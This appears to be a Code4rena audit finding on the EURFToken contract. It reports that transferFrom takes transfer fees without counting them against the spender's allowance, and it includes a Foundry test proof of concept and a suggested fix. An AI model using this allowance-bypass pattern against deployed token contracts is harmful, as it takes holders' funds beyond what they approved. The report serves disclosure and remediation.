## Next Generation
[Contest Details] (https://code4rena.com/reports/2025-01-next-generation)

### [Medium-01] Unauthorized Fees deduction byPassing Allowance checks in the Token contract

**Finding Description and Impact**
The EURFToken contract contains a critical vulnerability in its fee deduction mechanism during token transfers. The transferFrom function deducts transaction fees via an internal _update call before invoking the ERC20 transferFrom method. This internal transfer bypasses the allowance checks mandated by the ERC20 standard, allowing spenders to drain more tokens than explicitly approved.

**Impact**
1. Allowance Bypass: Attackers can exploit this to transfer tokens beyond the approved allowance, effectively stealing funds.
2. ERC20 Compliance Failure: Contracts relying on standard ERC20 allowance semantics will malfunction when interacting with EURF.
3. Funds Drain: A malicious spender can repeatedly call transferFrom until the victim's balance is exhausted, despite the original allowance.

**Proof of Concept**
Here is a coded proof of concept written in foundry, to run the test a foundry environment should be set up.

```javascript
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {EURFToken} from "contracts/Token.sol";

contract EURFTokenExploit is Test {
    EURFToken public eurf;
    address Alice = makeAddr("Alice");
    address Bob = makeAddr("Bob");
    address feeFaucet = makeAddr("feeFaucet");

    bytes32 public constant CONTROLLER_ROLE = 
        0x433aa8cd04e3bb4863b80cca89cac0174e1e63dfd1976ac065e50afdf7e63bb1;

    function setUp() public {
        eurf = new EURFToken();
        eurf.initialize();
        
        vm.startPrank(eurf.owner());
        eurf.grantRole(eurf.ADMIN(), address(this));
        eurf.grantRole(CONTROLLER_ROLE, address(this));
        vm.stopPrank();

        // Grant MINTER_ROLE and mint
        vm.startPrank(address(this));
        // eurf.grantRole(eurf.MINTER_ROLE(), address(this));
        eurf.addMinter(address(this), 1000 * 1e6);
        vm.stopPrank();

        eurf.mint(Alice, 1000 * 1e6); 
        eurf.setFeeFaucet(feeFaucet);
        eurf.setTxFeeRate(1000); // 10% of fee
       
    }

    function testExploit() public {
        // Alice approve Bobs for 100 EURF
        vm.prank(Alice);
        eurf.approve(Bob, 100 *1e6);

        // Bob transfer 100 EURF from Alice (should deduct 110 )
        vm.prank(Bob);
        eurf.transferFrom(Alice, Bob, 100 * 1e6);

        // check balances
        assertEq(eurf.balanceOf(Alice), 890 * 1e6);
        // assertEq(eurf.balanceOf(Bob), 110 * 1e6);
        assertEq(eurf.allowance(Alice, Bob), 0); // Allowance should be 0 after fix (fails without mitigation)
    }
}
```

**Recommended Mitigation**
I suggest adjusting the allowance checks to include the fee. So, when transferring, the contract should check that the allowance is at least amount + fee. Then, decrease the allowance by the total, not just the transferred amount. This ensures that the allowance covers both the transfer and the fee.